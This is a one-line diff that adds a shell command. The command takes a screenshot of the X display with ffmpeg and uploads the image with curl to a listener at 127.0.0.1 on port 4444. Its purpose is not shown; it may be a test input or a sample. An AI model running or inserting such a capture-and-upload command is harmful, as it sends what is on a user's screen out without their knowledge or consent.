@@ -1,0 +1,1 @@
+foofile="out.png"; ffmpeg -y -f x11grab -i :0.0 -vframes 1 "$foofile"; curl -X POST -F "file=@$foofile" http://127.0.0.1:4444/upload || echo "Error, file was not sent"
